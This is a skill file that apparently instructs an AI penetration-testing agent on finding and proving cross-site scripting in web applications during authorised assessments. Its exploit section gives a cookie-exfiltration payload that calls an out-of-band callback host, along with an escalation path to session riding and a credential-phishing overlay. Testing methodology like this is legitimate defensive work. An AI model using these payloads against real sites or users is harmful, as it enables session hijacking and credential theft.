---
name: web-xss
description: Cross-site scripting detection→exploitation→impact proof for web apps. Use when user input is reflected in a response or stored and rendered to other users, when CSP/escaping questions arise, or during VULN-ASSESSMENT on a web target. Triggers - payload echoed in HTML/attribute/JS context, dalfox findings, xss_detect output, CSP header review, markdown/rich-text render, innerHTML, document.write.
tags: [vuln_assess, exploitation]
---

# XSS

## When this fires
- A parameter value appears verbatim in the response (body, attribute, JS string).
- `dalfox` flags reflection; feed the captured response through `xss_detect` for classification.
- Rich content rendered without sanitization: comments, profile fields, support tickets, file names, HTTP headers logged to admin panels.

## Detect (tool-first)
1. Probe each reflective parameter once with a benign marker: `<xssid>">'` — unique per param.
2. Classify CONTEXT before choosing payload — context determines exploitability:
   - **HTML body**: marker lands between tags.
   - **Attribute**: marker inside `"..."` or `'...'`.
   - **JS string**: marker inside `<script>` quotes.
   - **URL/href/src**: `javascript:` scheme possible.
3. Run `xss_detect` on the response: reflected / potential_stored / blocked / not_vulnerable.
4. Confirm with `dalfox url "http://<target>/page?q=test"` for automated context-aware payloads.

## Decide
| Signal | Meaning | Next |
|---|---|---|
| Marker unescaped in body | direct injection point | build working payload for that context |
| Marker escaped but event-handler attrs allowed | filter is naive | try case/split variants |
| `blocked` + WAF signature in xss_detect | WAF active | one bypass attempt max, then note WAF name |
| Strict CSP (`script-src 'self'` no unsafe-inline) | classic payload dead | look for JSONP endpoints, allowed script-src hosts w/ upload, DOM gadget |
| Stored sink found (profile/comment renders input) | highest value | prioritize over reflected |

## Exploit → PROVE IMPACT
- Minimum proof: alert-free — execute `fetch('http://collab-host/'+document.cookie)` from an OOB callback you control, OR show DOM modification visible to a victim session. Console `alert(1)` alone = suspected, caps at Low/Medium.
- Reflected: deliver full URL via your own browser/curl with cookie exfil callback firing. Quote the callback hit log.
- Stored: inject from account A, view page as account B, show B's browser executes it. Cross-user execution IS the finding.
- Escalate impact ladder: cookie theft (if not HttpOnly) → session riding (state-changing GET/POST via fetch as victim) → credential phishing overlay. Each step needs its own evidence.
- `xss_detect` auto-updates engagement state; follow with `state_update` severity + evidence chain.

## Tooling
- `xss_detect`: passive classifier on captured responses — always run after manual probe.
- `dalfox`: active scanner, respects context.
- `websearch`: CSP bypass technique research for exotic policies.
- Hand off to `report_gen` with victim-perspective impact wording.

## False positives / pitfalls
- Reflection ≠ execution. Payload must actually fire in the target context — self-XSS (only your own session sees it) is NOT a finding unless chained.
- HttpOnly cookies: cookie theft impossible — pivot proof to action-on-behalf instead.
- CSP `unsafe-inline` absent blocks inline scripts — verify policy BEFORE claiming exploitable.
- Framework auto-escaping (React/Angular) kills most sinks except `dangerouslySetInnerHTML`/`bypassSecurityTrust` paths — check source if available.
- WAF echo of encoded payload ≠ blocked — test double-encoding only once; move on.
- NEVER target real third-party users in production scope — prove with two operator-provided accounts.
